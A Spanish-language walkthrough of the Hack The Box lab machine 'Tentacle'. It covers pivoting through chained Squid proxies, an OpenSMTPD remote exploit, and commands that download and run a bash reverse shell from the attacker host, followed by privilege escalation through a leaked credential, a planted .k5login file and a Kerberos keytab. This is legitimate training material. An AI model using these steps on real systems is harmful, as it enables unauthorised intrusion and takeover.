# Tentacle

Tags: [[_proxychains]],[[_pivoting]],[[_analysis]],[[_cve]],[[_permissionAbuse]],[[_timeTasks]],[[_internalPortAbusing]]

## Primeros pasos
(Reconocimiento).

<span style="color:#07b4f2">Organizamos</span> <span style="color:#ff2dc0">TMUX</span>.
<span style="color:#07b4f2">Activamos</span> <span style="color:#ff2dc0">VPN</span>.

Le <span style="color:#07b4f2">hacemos</span> un <span style="color:#ff2dc0">ping</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina</span>. (<span style="color:#379075">Está activa o no</span>).
<span style="color:#bef202">Posible</span> <span style="color:#ff2dc0">máquina Linux</span>.

<span style="color:#07b4f2">Ponemos</span> la <span style="color:#ff2dc0">IP</span> de la <span style="color:#ff2dc0">máquina</span> <span style="color:#07b4f2">en</span> un <span style="color:#07b4f2">lugar visible</span>.
<span style="color:#07b4f2">Creamos</span> un <span style="color:#07b4f2">directorio</span> <span style="color:#07b4f2">como</span> la <span style="color:#ff2dc0">IP</span> o <span style="color:#07b4f2">nombre</span> de la <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creamos</span> los <span style="color:#07b4f2">directorios</span> de <span style="color:#07b4f2">trabajo</span>.

<span style="color:#bef202">Empezamos el escaneo con</span> <span style="color:#ff2dc0">NMAP</span>. <span style="color:#379075">Otro escaneo de puertos comunes por posibles falsos negativos</span>.
<span style="color:#07b4f2">Buscamos</span> <span style="color:#ff2dc0">codename</span> con <span style="color:#ff2dc0">launchpad</span>, <span style="color:#bef202">un posible</span> <span style="color:#ecacb6">Ubuntu Bionic, RedHat</span>.

+ <span style="color:#ff669c">Puertos abiertos</span>

| Port                                    | Service               |
| --------------------------------------- | --------------------- |
| <span style="color:#ff669c">22</span>   | SSH 8.2p1             |
| <span style="color:#ff669c">53</span>   | ISC BIND 9.11.20      |
| <span style="color:#ff669c">88</span>   | Kerberos              |
| <span style="color:#ff669c">3128</span> | Squid-HTTP proxy 4.11 |

<span style="color:#ff2dc0">UDP</span>.

| Port                                   | Service |
| -------------------------------------- | ------- |
| <span style="color:#ff669c">53</span>  |         |
| <span style="color:#ff669c">88</span>  |         |
| <span style="color:#ff669c">123</span> |         |


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff669c">22</span>.
<span style="color:#07b4f2">No tengo</span> <span style="color:#ff2dc0">credenciales</span> válidas.

<span style="color:#ff669c">53</span>.
<span style="color:#ff2dc0">ISC BIND</span>. Es un servidor <span style="color:#ff2dc0">DNS</span>.

Vamos a <span style="color:#ff2dc0">enumerar</span> por <span style="color:#ff2dc0">subdominios</span>.
<span style="color:#88c425">dnsenum --dnsserver 10.10.10.224 --threads 20 -f /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb</span>
<span style="color:#ecacb6">ns.realcorp.htb</span> - <span style="color:#ecacb6">10.197.243.77</span>
<span style="color:#ecacb6">proxy.realcorp.htb</span> - <span style="color:#ecacb6">ns.realcorp.htb</span>
<span style="color:#ecacb6">wpad.realcorp.htb</span>- <span style="color:#ecacb6">10.197.243.31</span>
Los <span style="color:#07b4f2">metemos al</span> <span style="color:#ecacb6">/etc/hosts</span>, <span style="color:#07b4f2">notemos</span> que tienen<span style="color:#ff2dc0"> IP</span>s <span style="color:#07b4f2">distintas</span>.
<span style="color:#07b4f2">Los metemos con dichas</span> <span style="color:#ff2dc0">IP</span>, <span style="color:#07b4f2">dejamos</span> que <span style="color:#ff2dc0">apunten</span> a <span style="color:#07b4f2">su</span> <span style="color:#ff2dc0">IP</span>, y podríamos <span style="color:#07b4f2">quitar</span> los de <span style="color:#ecacb6">ns.realcorp.htb</span>
<span style="color:#bef202">Volvemos al 88</span>.

<span style="color:#ff669c">88</span>.
Vamos a utilizar <span style="color:#ff2dc0">kerbrute</span> para <span style="color:#ff2dc0">enumerar</span> <span style="color:#ecacb6">usuarios</span>, con el <span style="color:#07b4f2">fin</span> de <span style="color:#07b4f2">tratar</span> de <span style="color:#07b4f2">hacer</span> un <span style="color:#ff2dc0">ataque de fuerza bruta</span> <span style="color:#07b4f2">sobre</span> el <span style="color:#ff2dc0">squid proxy</span>.
<span style="color:#07b4f2">Tenemos</span> <span style="color:#ff2dc0">dominio</span>, pero <span style="color:#ff2dc0">enumeramos</span> <span style="color:#07b4f2">más</span>.
<span style="color:#bef202">Vamos al 53</span>.

<span style="color:#07b4f2">Continuamos</span> <span style="color:#ff2dc0">enumerando</span> <span style="color:#ecacb6">usuarios</span> con <span style="color:#ff2dc0">kerbrute</span>, <span style="color:#07b4f2">confirmamos</span> que <span style="color:#ecacb6">j.nakazawa@realcorp.htb</span> es un <span style="color:#ecacb6">usuario</span> <span style="color:#07b4f2">válido</span> e incluso <span style="color:#ff2dc0">ASREPRoastable</span>, pero <span style="color:#07b4f2">no conseguimos mucho</span>.
<span style="color:#bef202">Volvemos al 3128</span>.


<span style="color:#ff669c">3128</span>.
Es un <span style="color:#ff2dc0">proxy HTTP</span>/<span style="color:#ff2dc0">TCP</span>.
<span style="color:#07b4f2">Seguramente</span> la idea sería <span style="color:#07b4f2">pasar</span> por un <span style="color:#ff2dc0">proxy</span>.
En <span style="color:#ecacb6">/etc/proxychains.conf</span> <span style="color:#07b4f2">lo añado</span> como <span style="color:#ff2dc0">proxy</span> de tipo <span style="color:#ff2dc0">HTTP</span>, y <span style="color:#07b4f2">que esté</span> en<span style="color:#ff2dc0"> strict chain</span>, pero <span style="color:#07b4f2">no</span> me <span style="color:#07b4f2">funciona bien</span>.

En <span style="color:#ff2dc0">foxy proxy</span> <span style="color:#07b4f2">creo</span> el <span style="color:#ff2dc0">proxy</span> de tipo <span style="color:#ff2dc0">HTTP</span>, <span style="color:#07b4f2">con</span> la <span style="color:#ff2dc0">IP</span> y <span style="color:#ff669c">puerto 3128</span> de la <span style="color:#ff2dc0">máquina víctima</span>. <span style="color:#07b4f2">Ingreso</span> a la <span style="color:#07b4f2">página</span> por el <span style="color:#ff669c">80</span> y me deja, de hecho <span style="color:#07b4f2">me muestra</span> lo <span style="color:#07b4f2">mismo</span> para <span style="color:#07b4f2">cualquier</span> <span style="color:#ff669c">puerto</span> que <span style="color:#07b4f2">ponga</span>.

Me <span style="color:#07b4f2">pide</span> <span style="color:#ff2dc0">credenciales</span>. <span style="color:#07b4f2">Por ello no</span> me <span style="color:#07b4f2">servía</span> bien con <span style="color:#ff2dc0">proxychains</span>, porque <span style="color:#07b4f2">no estoy</span> <span style="color:#ff2dc0">autenticado</span>.
<span style="color:#07b4f2">Investigando</span> vemos que en <span style="color:#ecacb6">/etc/proxychains.conf</span> <span style="color:#07b4f2">se debe poner</span> así
<span style="color:#ecacb6">http 10.10.10.224 3128 username passw0rd .</span>
<span style="color:#379075">Con las credenciales correctas</span>.

Si hago
<span style="color:#88c425">curl --proxy http://10.10.10.224:3128 http://10.10.10.224</span> :    <span style="color:#07b4f2">intento llegar</span> al <span style="color:#ff669c">80</span> <span style="color:#07b4f2">por</span> el <span style="color:#ff2dc0">proxy</span>, <span style="color:#07b4f2">pero</span> me <span style="color:#07b4f2">aparece</span> la <span style="color:#ff2dc0">web</span> de<span style="color:#07b4f2"> este último</span>, porque <span style="color:#07b4f2">no me estoy</span> <span style="color:#ff2dc0">autenticando</span>.
<span style="color:#07b4f2">Buscando</span> por <span style="color:#ff2dc0">default credentials</span>, pero <span style="color:#07b4f2">no encontramos</span>.

Si <span style="color:#07b4f2">entramos</span> a <span style="color:#ecacb6">http://10.10.10.224:3128</span> <span style="color:#07b4f2">sin pasar</span> por algún <span style="color:#ff2dc0">proxy</span>, <span style="color:#07b4f2">vemos</span> la <span style="color:#07b4f2">página</span> del <span style="color:#ff2dc0">squid proxy</span> con <span style="color:#07b4f2">información</span>.
<span style="color:#ecacb6">j.nakazawa@realcorp.htb</span> -> tenemos un <span style="color:#ecacb6">usuario</span>.
<span style="color:#ecacb6">srv01.realcorp.htb</span>
<span style="color:#07b4f2">Contemplamos</span> el <span style="color:#ff2dc0">dominio</span> y <span style="color:#ff2dc0">subdominio</span> en el <span style="color:#ecacb6">/etc/hosts</span>
<span style="color:#bef202">Vamos al 88</span>.

Hay que <span style="color:#07b4f2">tratar</span> de <span style="color:#07b4f2">hacer mejor </span>el <span style="color:#ff2dc0">escaneo</span> con <span style="color:#ff2dc0">NMAP</span> <span style="color:#07b4f2">pasando por</span> el <span style="color:#ff2dc0">proxy</span>.
<span style="color:#88c425">proxychains nmap -sT -Pn -v -n 127.0.0.1 2>/dev/null</span> :    curioso,<span style="color:#07b4f2"> aún sin ingresar</span> <span style="color:#ff2dc0">credenciales</span> puedo <span style="color:#ff2dc0">enumerar</span>.
<span style="color:#ecacb6">-sT</span> <span style="color:#ff2dc0">TCP Connect Scan</span>, sino no se puede.
<span style="color:#ecacb6">127.0.0.1</span> en <span style="color:#07b4f2">mi</span> <span style="color:#ff2dc0">equipo</span>, porque <span style="color:#07b4f2">pasamos por</span> el <span style="color:#ff2dc0">proxy</span>.

<span style="color:#07b4f2">Nuevos</span> <span style="color:#ff669c">puertos</span>.
<span style="color:#ff669c">464</span>
<span style="color:#ff669c">749</span>

<span style="color:#07b4f2">Recordando</span> que <span style="color:#07b4f2">tenemos</span> los <span style="color:#ff2dc0">subdominios</span> que <span style="color:#ff2dc0">apuntan</span> a varias <span style="color:#ff2dc0">IP</span>s, podemos <span style="color:#ff2dc0">enumerar</span> <span style="color:#07b4f2">dichos</span> <span style="color:#ff2dc0">activos</span> <span style="color:#07b4f2">pasando</span> por el <span style="color:#ff2dc0">proxy</span>.
<span style="color:#88c425">proxychains nmap -sT -Pn -v -n 10.197.243.77 2>/dev/null</span> :    pero <span style="color:#07b4f2">no reporta</span> <span style="color:#ff2dc0">puertos</span>.
<span style="color:#ecacb6">10.197.243.77</span> <span style="color:#07b4f2">es del</span> <span style="color:#ecacb6">proxy.realcorp.htb</span>

>[!question] ¿Por qué quiero alcanzarlo?
>Porque puedo pasar por el squid proxy que tenemos, aprovechar su interfaz interna para alcanzar al siguiente squid proxy (eso parece ser por el nombre), para así llegar a ver nuevos puertos que hayan abiertos en dicho activo.

[[SquiProxy2024-12-13 23.35.41.excalidraw]]
Hacerlo.
En <span style="color:#ecacb6">/etc/proxychains </span>
<span style="color:#07b4f2">Debajo</span> de la <span style="color:#07b4f2">línea</span> que <span style="color:#07b4f2">tenemos</span> del <span style="color:#ff2dc0">proxy</span> de tipo <span style="color:#ff2dc0">HTTP</span>, pongo
<span style="color:#ecacb6">http 127.0.0.1 3128</span> :    <span style="color:#07b4f2">recordamos</span> que <span style="color:#07b4f2">al</span> <span style="color:#ff2dc0">localhost escaneamos</span> antes?, esto <span style="color:#07b4f2">es porque necesito hacer</span> las <span style="color:#ff2dc0">consultas</span> de forma <span style="color:#ff2dc0">local</span> <span style="color:#07b4f2">para</span> que <span style="color:#07b4f2">las tome</span> el <span style="color:#ff2dc0">proxy</span>, y claro, <span style="color:#07b4f2">al colocar esa nueva línea</span> conseguimos que, <span style="color:#07b4f2">al mandar nuestras</span> <span style="color:#ff2dc0">consultas</span> al <span style="color:#ff2dc0">localhost</span> <span style="color:#07b4f2">las tome</span> el <span style="color:#ff2dc0">squid proxy</span>, <span style="color:#07b4f2">pero configuramos para que pase</span> las <span style="color:#ff2dc0">peticiones</span> <span style="color:#07b4f2">así mismo por su</span> <span style="color:#ff2dc0">localhost</span>, y así <span style="color:#07b4f2">tratar</span> de <span style="color:#07b4f2">alcanzar</span> la otra <span style="color:#ff2dc0">IP</span>.
![[Pasted image 20241213235809.png]]

De esta manera <span style="color:#07b4f2">vemos</span> <span style="color:#ff669c">puertos</span> <span style="color:#07b4f2">abiertos</span> de <span style="color:#ecacb6">10.197.243.77</span>, lo que<span style="color:#07b4f2"> quiere decir</span> que <span style="color:#07b4f2">lo estamos alcanzando</span>.
<span style="color:#ff669c">22</span>, <span style="color:#ff669c">53</span>, <span style="color:#ff669c">88</span>, <span style="color:#ff669c">464</span>, <span style="color:#ff669c">749</span>, <span style="color:#ff669c">3128</span>

Sí, lo que estamos pensando, <span style="color:#07b4f2">otro</span> <span style="color:#ff2dc0">squid proxy</span>, entonces <span style="color:#07b4f2">tratemos</span> de <span style="color:#07b4f2">realizar</span> la <span style="color:#07b4f2">misma idea</span>.
<span style="color:#07b4f2">Si intentamos</span> <span style="color:#ff2dc0">escanear</span> los puertos de <span style="color:#ecacb6">10.197.243.31</span> (<span style="color:#ecacb6">wpad.realcorp.htb</span>) <span style="color:#07b4f2">no llegamos</span>, <span style="color:#07b4f2">pero si añadimos</span> en <span style="color:#ecacb6">/etc/proxychains.conf</span>
<span style="color:#ecacb6">http 10.197.243.77 3128 </span>:    ya <span style="color:#07b4f2">llegamos</span> y <span style="color:#07b4f2">podemos</span> hacer
<span style="color:#88c425">proxychains nmap -sT -Pn -v -n 10.197.243.31 2>/dev/null</span>
![[Pasted image 20241214005450.png]]
[[SquiProxy2024-12-13 23.35.41.excalidraw]]

De esta manera <span style="color:#07b4f2">vemos</span> los <span style="color:#ff2dc0">puertos</span> <span style="color:#07b4f2">abiertos</span> de <span style="color:#ecacb6">10.197.243.31</span>, lo que quiere decir que lo alcanzamos.
<span style="color:#ff669c">22</span>, <span style="color:#ff669c">53</span>, <span style="color:#ff669c">80</span>, <span style="color:#ff669c">88</span>, <span style="color:#ff669c">464</span>, <span style="color:#ff669c">749</span>, <span style="color:#ff669c">3128</span>
<span style="color:#07b4f2">Interesante</span>, un <span style="color:#ff2dc0">servidor HTTP</span> por el<span style="color:#ff669c"> puerto 80</span>.
<span style="color:#88c425">proxychains curl -s -X GET http://wpad.realcorp.htb</span> :    vemos el <span style="color:#ff2dc0">contenido</span>, aunque es un <span style="color:#ff2dc0">Forbidden</span>.

<span style="color:#07b4f2">Investigando</span> lo que es <span style="color:#ff2dc0">wpad</span>.
<span style="color:#ff2dc0">WPAD</span>. 
<span style="color:#ff2dc0">Web Proxy Auto-Discovery</span>. <span style="color:#ff2dc0">Protocolo</span> que <span style="color:#07b4f2">garantiza</span> que <span style="color:#07b4f2">todos</span> los <span style="color:#ff2dc0">dispositivos</span> dentro de una <span style="color:#ff2dc0">red</span> <span style="color:#07b4f2">utilicen</span> la <span style="color:#07b4f2">misma configuración</span> de <span style="color:#ff2dc0">proxy web </span>sin que los administradores tengan que realizar una configuración manual en cada dispositivo final. 

Buscamos <span style="color:#ecacb6">wpad routes config files</span> en <span style="color:#ff2dc0">Internet</span> y encontramos
https://serverfault.com/questions/54567/internet-explorer-isnt-auto-discovering-http-wpad-wpad-dat-auto-config
Ruta
<span style="color:#ecacb6">http://wpad/wpad.dat</span>

<span style="color:#88c425">proxychains curl -s -X GET http://wpad.realcorp.htb/wpad.dat</span> :    vemos como un <span style="color:#ff2dc0">archivo</span> de <span style="color:#07b4f2">configuración</span> con lo siguiente
![[Pasted image 20241214013619.png]]

Siendo observadores, nos damos cuenta que <span style="color:#07b4f2">hay</span> un <span style="color:#ff2dc0">segmento</span> que <span style="color:#07b4f2">no</span> hemos <span style="color:#07b4f2">visto</span>.
<span style="color:#ecacb6">10.241.251.0</span>
Tratemos de <span style="color:#07b4f2">hacerle</span> <span style="color:#ff2dc0">reconocimiento</span>, porque <span style="color:#07b4f2">gracias</span> a los <span style="color:#ff2dc0">proxys</span> que <span style="color:#07b4f2">añadimos tenemos alcance</span>.
Hacemos un <span style="color:#ff2dc0">script</span> en <span style="color:#ff2dc0">bash</span> para <span style="color:#ff2dc0">enumerar</span> <span style="color:#ff669c">puertos</span> comunes sobre un <span style="color:#07b4f2">rango</span> de <span style="color:#ff2dc0">IP</span>s.
![[Pasted image 20241214021546.png]]

<span style="color:#ecacb6">10.241.251.1</span>
<span style="color:#ff669c">22</span>, <span style="color:#ff669c">53</span>

<span style="color:#ecacb6">10.241.251.113</span>
<span style="color:#ff669c">25</span>

Podemos ver que <span style="color:#07b4f2">tenemos</span> el <span style="color:#ff2dc0">SMTP</span> en <span style="color:#ecacb6">10.241.251.113</span>.
<span style="color:#88c425">proxychains nmap -p25 -sT -Pn -sCV 10.241.251.113 2>/dev/null</span>
En el <span style="color:#ff2dc0">SMTP 2.0.0</span>, nos <span style="color:#07b4f2">da</span> un <span style="color:#ff2dc0">subdominio</span> <span style="color:#ecacb6">smtp.realcorp.htb </span>, pero <span style="color:#07b4f2">no</span> la <span style="color:#07b4f2">metemos en</span> el <span style="color:#ecacb6">/etc/hosts</span>

<span style="color:#07b4f2">Buscando</span> <span style="color:#ff2dc0">vulnerabilidades</span> por <span style="color:#ff2dc0">OpenSMTPD</span>.
<span style="color:#ff2dc0">searchsploit</span> <span style="color:#ecacb6">linux/remote/47984.py</span>, nos pide parámetros, pero hay que <span style="color:#07b4f2">pasar por</span> <span style="color:#ff2dc0">proxychains</span>.
También, juega con <span style="color:#ff2dc0">RCPT TO</span> y se <span style="color:#07b4f2">lo manda a</span> <span style="color:#ecacb6">root</span>, pero <span style="color:#07b4f2">puede</span> que <span style="color:#07b4f2">no exista</span>, pero haciendo memoria, <span style="color:#07b4f2">tenemos</span> un <span style="color:#ecacb6">usuario</span> <span style="color:#07b4f2">válido</span>, <span style="color:#ecacb6">j.nakazawa@realcorp.htb</span>
Probemos con él.
<span style="color:#88c425">proxychains python3 47984.py 10.241.251.113 25 "wget 10.10.14.15"</span> :    <span style="color:#07b4f2">nos llega</span> el <span style="color:#ff2dc0">GET</span> (<span style="color:#379075">raro porque si ponemos http://... no llega</span>).

<span style="color:#bef202">Ganar acceso</span>.
+<span style="color:#07b4f2">Creo</span> un <span style="color:#ecacb6">index.html</span> con una <span style="color:#ff2dc0">reverse shell</span> en <span style="color:#ff2dc0">bash</span>.
+<span style="color:#ff2dc0">Monto</span> un <span style="color:#ff2dc0">server HTTP</span>.
+Hago
<span style="color:#88c425">proxychains python3 47984.py 10.241.251.113 25 "wget 10.10.14.15" -O /dev/shm/rev</span>
+Hago
<span style="color:#88c425">proxychains python3 47984.py 10.241.251.113 25 "bash /dev/shm/rev"</span>
Y pa deeeeentro.


---

>[!Warning] No olvidemos UDP
>Si no vemos cosas de las que nos podamos aprovechar en los puertos por TCP, vamos a UDP.
>
>No vemos mucho por UDP tampoco.


>[!Tip] Escaner en Bash
>Como va algo lento con NMAP, podemos automatizarlo en bash.
>Con un timeout 1, e independizando procesos.


## Escalada

Estamos en un contenedor.
<span style="color:#ff2dc0">Host</span>: <span style="color:#ecacb6">10.241.251.113</span>
<span style="color:#ff2dc0">Usuario</span>: <span style="color:#ecacb6">root</span>

La máquina real podría ser <span style="color:#ecacb6">10.241.251.1</span>, y recordando tiene puertos abiertos.
Hacemos un <span style="color:#ff2dc0">host discovery</span> pero <span style="color:#07b4f2">encontramos</span> lo <span style="color:#07b4f2">mismo</span> de <span style="color:#07b4f2">antes</span>
<span style="color:#ecacb6">10.241.251.1</span> <span style="color:#07b4f2">con</span> los <span style="color:#ff669c">puertos 22</span>, <span style="color:#ff669c">53</span>, <span style="color:#ff669c">88</span>
<span style="color:#ecacb6">10.241.251.113</span> <span style="color:#07b4f2">con</span> el <span style="color:#ff669c">25</span>

<span style="color:#ff669c">Puertos</span> <span style="color:#ff2dc0">internos</span>.
<span style="color:#ff669c">25</span>
<span style="color:#ff669c">465</span>
<span style="color:#ff669c">587</span>
<span style="color:#ff669c">34604</span>

En <span style="color:#ecacb6">/home/j.nakazawa</span> <span style="color:#07b4f2">hay</span> un <span style="color:#ecacb6">.msmtprc</span>
Tenemos <span style="color:#07b4f2">información</span>, entre ella <span style="color:#ff2dc0">credenciales</span>
<span style="color:#ecacb6">tls_trust_file /etc/ssl/certs/ca-certificates.crt</span>
<span style="color:#ecacb6">j.nakazawa:sJB}RM>6Z~64_</span>
<span style="color:#07b4f2">Probamos</span> rápidamente a <span style="color:#ff2dc0">conectarnos</span> por <span style="color:#ff2dc0">SSH</span> a <span style="color:#ecacb6">10.10.10.224</span> (<span style="color:#379075">máquina real</span>) pero <span style="color:#07b4f2">no</span> nos <span style="color:#07b4f2">deja</span>.

Buscamos <span style="color:#ecacb6">how to use a PEM file</span> en <span style="color:#ff2dc0">Internet</span> y vemos <span style="color:#07b4f2">cosas</span> de que nos <span style="color:#07b4f2">podemos</span> conectar por <span style="color:#ff2dc0">SSH</span> <span style="color:#07b4f2">usando</span> un <span style="color:#ecacb6">PEM file</span>.

Si de primeras hacemos
<span style="color:#88c425">ssh j.nakazawa@10.10.10.224</span>
<span style="color:#07b4f2">Introducimos</span> una <span style="color:#07b4f2">3 veces</span> una <span style="color:#07b4f2">contraseña</span>, nos sale el siguiente <span style="color:#07b4f2">error</span>
<span style="color:#ecacb6">j.nakazawa@10.10.10.224: Permission denied (gssapi-keyex,gssapi-with-mic,password).</span>
<span style="color:#07b4f2">Investigando</span> por ese <span style="color:#07b4f2">error</span> vemos que <span style="color:#07b4f2">podemos</span> usar <span style="color:#ecacb6">-v</span> con <span style="color:#ff2dc0">ssh</span>.
<span style="color:#88c425">ssh j.nakazawa@10.10.10.224 -vvv</span> :    vemos el <span style="color:#ff2dc0">verbose</span>, y nos damos cuenta de algo
<span style="color:#ecacb6">No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_0)</span>

<span style="color:#07b4f2">Parece</span> que <span style="color:#07b4f2">utiliza</span> <span style="color:#ff2dc0">Kerberos</span> como <span style="color:#07b4f2">método</span> de <span style="color:#ff2dc0">autenticación</span>, <span style="color:#07b4f2">por eso</span> el <span style="color:#ff669c">88</span> está <span style="color:#ff2dc0">abierto</span>.
Podemos tratar de <span style="color:#07b4f2">aprovecharnos</span> de esto, <span style="color:#379075">véase /Vulnerabilidades y Temas/Protocolos (Servicios)/SSH/Fallos de Configuración SSH</span>.

<span style="color:#bef202">Proceder</span>.
+Me <span style="color:#07b4f2">traigo</span> el <span style="color:#ecacb6">.crt</span> <span style="color:#07b4f2">a mi </span><span style="color:#ff2dc0">máquina</span> (<span style="color:#379075">no hace falta</span>).
+<span style="color:#07b4f2">Hacemos lo que</span> <span style="color:#379075">vemos en /Vulnerabilidades y Temas/Protocolos (Servicios)/SSH/Fallos de Configuración SSH</span> para <span style="color:#ff2dc0">abusar</span> del <span style="color:#ff2dc0">SSH</span> <span style="color:#07b4f2">cuando usa</span> <span style="color:#ff2dc0">Kerberos</span>.
Hay que <span style="color:#07b4f2">tener en cuenta</span> los <span style="color:#ff2dc0">dominios</span> y la <span style="color:#ff2dc0">IP</span>.
El <span style="color:#ecacb6">krb5.conf</span> nos <span style="color:#07b4f2">queda así</span>
![[Pasted image 20241214203003.png]]
+Ya nos podríamos <span style="color:#ff2dc0">conectar</span> <span style="color:#07b4f2">por</span> <span style="color:#ff2dc0">SSH</span> y <span style="color:#07b4f2">leería</span> del <span style="color:#ff2dc0">archivo</span> necesario que <span style="color:#07b4f2">creamos</span> y entramos.


<span style="color:#ff2dc0">Host</span>: <span style="color:#ecacb6">10.10.10.224</span>
<span style="color:#ff2dc0">Usuario</span>: <span style="color:#ecacb6">j.nakazawa</span>

<span style="color:#ecacb6">root</span>
<span style="color:#ecacb6">j.nakazawa</span>
<span style="color:#ecacb6">admin</span> 

<span style="color:#88c425">cat /etc/crontab</span> :    vemos que el usuario <span style="color:#ecacb6">admin</span> <span style="color:#07b4f2">ejecuta cada minuto</span> <span style="color:#ecacb6">/usr/local/bin/log_backup.sh</span>
![[Pasted image 20241214205820.png]]
<span style="color:#ecacb6">1.-</span> Trae todo <span style="color:#07b4f2">lo que hay</span> en <span style="color:#ecacb6">/var/log/squid/</span> y <span style="color:#07b4f2">lo mete en</span> <span style="color:#ecacb6">/home/admin</span>
<span style="color:#ecacb6">2.-</span> En <span style="color:#ecacb6">/home/admin</span> hace un <span style="color:#ff2dc0">comprimido</span> de dos <span style="color:#ecacb6">.log</span>
<span style="color:#ecacb6">3.</span>- <span style="color:#07b4f2">Borra</span> dichos archivos <span style="color:#ecacb6">.log</span>

<span style="color:#ecacb6">j.nakazawa</span> <span style="color:#07b4f2">pertenece</span> al <span style="color:#ff2dc0">grupo</span> <span style="color:#ecacb6">squid</span>, entonces <span style="color:#07b4f2">puede</span> <span style="color:#ff2dc0">escribir</span> en <span style="color:#ecacb6">/var/log/squid</span>, y <span style="color:#07b4f2">tratar</span> de <span style="color:#07b4f2">meter</span> ahí un <span style="color:#ff2dc0">directorio</span> <span style="color:#ecacb6">.ssh</span> con mi <span style="color:#ff2dc0">clave pública</span> como <span style="color:#ecacb6">authorized_keys</span>
Pero como <span style="color:#379075">vemos en /Vulnerabilidades y Temas/Protocolos (Servicios)/SSH/Fallos de Configuración SSH</span>, podemos <span style="color:#07b4f2">meter</span> un <span style="color:#ecacb6">.k5login</span> <span style="color:#07b4f2">en</span> el <span style="color:#ff2dc0">directorio</span> personal de un <span style="color:#ff2dc0">usuario</span> para <span style="color:#07b4f2">tratar</span> de <span style="color:#ff2dc0">conectarnos</span>, así que <span style="color:#bef202">procedemos</span> a intentarlo.
+El archivo <span style="color:#ecacb6">.k5login</span> debe <span style="color:#07b4f2">tener</span> "<span style="color:#ecacb6">j.nakazawa@REALCORP.HTB</span>", porque <span style="color:#07b4f2">este tenemos en nuestra</span> <span style="color:#ff2dc0">máquina</span>.
+Nos <span style="color:#ff2dc0">conectamos</span> como <span style="color:#ecacb6">admin</span> por <span style="color:#ff2dc0">SSH</span> y <span style="color:#07b4f2">no pide</span> <span style="color:#ff2dc0">contraseña</span>.


<span style="color:#ff2dc0">Usuario</span>: <span style="color:#ecacb6">admin</span>
<span style="color:#07b4f2">Busquemos</span> <span style="color:#ff2dc0">archivos</span>, cuyo <span style="color:#ff2dc0">propietario</span> sea <span style="color:#ecacb6">admin</span>, también de los que sea <span style="color:#ff2dc0">grupo</span>.
<span style="color:#07b4f2">Encontramos</span> <span style="color:#ecacb6">/etc/krb5.keytab</span>

Podemos <span style="color:#379075">ver en /Vulnerabilidades y Temas/Protocolos (Servicios)/Explotar Kerberos</span> cómo <span style="color:#07b4f2">aprovechar</span> dicho <span style="color:#ff2dc0">archivo</span> para <span style="color:#07b4f2">crear</span> un nuevo <span style="color:#ff2dc0">Principal</span>, <span style="color:#07b4f2">ponerle</span> <span style="color:#ff2dc0">contraseña</span> y salir para poder <span style="color:#07b4f2">hacer</span> <span style="color:#88c425">ksu</span>, <span style="color:#07b4f2">proporcionar</span> la <span style="color:#ff2dc0">contraseña</span> <span style="color:#07b4f2">creada</span> y pa deeeentro.
Fin.
